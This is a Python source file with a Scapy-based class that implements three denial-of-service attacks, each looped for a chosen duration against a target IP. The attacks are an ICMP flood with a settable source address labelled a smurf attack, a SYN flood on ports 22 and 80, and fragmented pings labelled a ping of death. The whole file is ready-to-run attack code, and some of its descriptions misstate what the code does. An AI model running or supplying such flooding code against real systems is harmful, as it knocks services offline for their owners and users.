import scapy.all as scapy
import time


class ScapyAttack:
    """Abstract class for attacks
    """

    def __init__(self, ip_source: str, ip_dest: str, duration: int):
        """Constructor

        Args:
            ip_source (str): the IP of the source machine
            ip_dest (str): the IP of the destination machine
            duration (int): the duration of the attack
        """
        self.ip_source = ip_source
        self.ip_dest = ip_dest
        self.duration = duration

    def execute(self, duration: int, attack_function: callable) -> None:
        debut = time.time()
        while (time.time() - debut) < duration:
            attack_function()

    def smurf_attack(self) -> None:
        """Smurf attack
        Distributed denial of service (DDoS) attack in which an attacker attempts
        to saturate a target server with ICMP packets

        Args:
            ip_source (str): the IP of the source machine
            ip_dest (str): the IP of the destination machine
            duration (int): the duration of the attack
        """
        print("Smurf attack on " + self.ip_dest +
              " for " + str(self.duration) + " seconds")
        self.execute(self.duration, lambda: scapy.send(
            scapy.IP(src=self.ip_source, dst=self.ip_dest)/scapy.ICMP()))

    def syn_flooding_attack(self) -> None:
        """Syn flooding attack
        Computer attack aiming at achieving a denial of service.
        It is applied within the TCP protocol and consists in sending a succession of SYN requests to the target

        Args:
            ip_dest (str): the IP of the destination machine
            duration (int): the duration of the attack
        """
        print("Syn flooding attack on " + self.ip_dest +
              " for " + str(self.duration) + " seconds")
        topt = [('Timestamp', (10, 0))]
        p = scapy.IP(dst=self.ip_dest, id=1111, ttl=99)/scapy.TCP(sport=scapy.RandShort(),
                                                                  dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S", options=topt)/"SYNFlood"
        self.execute(self.duration, lambda: scapy.send(p))

    def ping_of_death(self) -> None:
        """Ping of death attack
        Denial of service attack performed by sending a malformed ping packet to a target machine

        Args:
            ip_dest (str): the IP of the destination machine
            duration (int): the duration of the attack
        """
        print("Ping of death attack on " + self.ip_dest +
              " for " + str(self.duration) + " seconds")
        self.execute(self.duration, lambda: scapy.send(
            scapy.fragment(scapy.IP(dst=self.ip_dest)/scapy.ICMP()/('X' * 600))))
